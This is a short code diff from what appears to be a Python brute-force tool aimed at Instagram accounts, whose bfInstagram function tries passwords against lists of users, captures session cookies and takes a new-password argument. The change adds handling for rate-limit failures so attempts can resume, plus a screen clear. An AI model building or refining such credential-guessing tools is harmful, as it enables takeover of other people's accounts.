@@ -200,9 +200,9 @@ def bfInstagram(users, password, command, newpassword):
 
 		for i, future in enumerate(futures):
 			result, username, password, cookie = future.result()
-			login = re.findall(r"\"authenticated\"\: (.*?)\,", result)[0]
-
-			if not login:
+			try:
+				login = re.findall(r"\"authenticated\"\: (.*?)\,", result)[0]
+			except IndexError:
 				print(f"[{R + B}!{C}]Please wait a few minutes before you try again.")
 				print()
 				t = 60
@@ -554,6 +554,7 @@ if __name__ == "__main__":
 
 		elif cmd == "6":
 			os.system("xdg-open https://t.me/Xractz")
+			os.system("clear")
 			sys.exit()
 
 
